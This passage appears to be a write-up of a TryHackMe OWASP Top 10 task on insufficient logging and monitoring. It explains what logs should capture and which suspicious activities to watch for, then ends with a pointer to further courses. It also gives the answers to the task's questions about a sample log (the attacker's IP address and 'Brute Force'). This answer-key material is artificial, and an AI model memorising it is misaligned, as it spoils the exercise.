### TASK 30. [Severity 10] Insufficient Logging and Monitoring

<p>When web applications are set up, every action performed by the user should be logged. Logging is important because in the event of an incident, the attackers actions can be traced. Once their actions are traced, their risk and impact can be determined. Without logging, there would be no way to tell what actions an attacker performed if they gain access to particular web applications. The bigger impacts of these include:</p><ul><li>regulatory damage: if an attacker has gained access to personally identifiable user information and there is no record of this, not only are users of the application affected, but the application owners may be subject to fines or more severe actions depending on regulations.</li><li>risk of further attacks: without logging, the presence of an attacker may be undetected. This could allow an attacker to launch further attacks against web application owners by stealing credentials, attacking infrastructure and more.</li></ul><p>The information stored in logs should include:</p><ul><li>HTTP status codes</li><li>Time Stamps</li><li>Usernames</li><li>API endpoints/page locations</li><li>IP addresses</li></ul><p>These logs do have some sensitive information on them so its important to ensure that logs are stored securely and multiple copies of these logs are stored at different locations.</p><p>As you may have noticed, logging is more important after a breach or incident has occurred. The ideal case is having monitoring in place to detect any suspicious activity. The aim of detecting this suspicious activity is to either stop the attacker completely or reduce the impact they've made if their presence has been detected much later than anticipated. Common examples of suspicious activity includes:</p><ul><li>multiple unauthorised attempts for a particular action (usually authentication attempts or access to unauthorised resources e.g. admin pages)</li><li>requests from anomalous IP addresses or locations: while this can indicate that someone else is trying to access a particular user's account, it can also have a false positive rate.</li><li>use of automated tools: particular automated tooling can be easily identifiable e.g. using the value of User-Agent headers or the speed of requests. This can indicate an attacker is using automated tooling.</li><li>common payloads: in web applications, it's common for attackers to use Cross Site Scripting (XSS) payloads. Detecting the use of these payloads can indicate the presence of someone conducting unauthorised/malicious testing on applications.</li></ul><p>Just detecting suspicious activity isn't helpful. This suspicious activity needs to be rated according to the impact level. For example, certain actions will higher impact than others. These higher impact actions need to be responded to sooner thus they should raise an alarm which raises the attention of the relevant party.</p><p>Put this knowledge to practise by analysing this sample log file.</p>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. What IP address is the attacker using?

```
49.99.13.16
```

2. <p>What kind of attack is being carried out?<br /></p>

```
Brute Force
```

----------------------------------------

### TASK 31. What Next?

<div style="text-align:center"><span style="font-size:24px">﻿</span><span style="font-size:24px">What Next?<br /></span><span style="font-size:24px"></span></div><div style="text-align:center"><span style="font-size:18px"><span style="font-size:18px">Why not enroll in our </span><a href="https://tryhackme.com/path/outline/beginner" target="_blank"><span style="font-size:18px">beginner level pathway</span></a><span style="font-size:18px"> or </span></span><a href="https://tryhackme.com/hacktivities" target="_blank"><span style="font-size:18px">find another room</span></a><span style="font-size:18px"> to complete?</span></div>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. Read the above!

```
OK
```

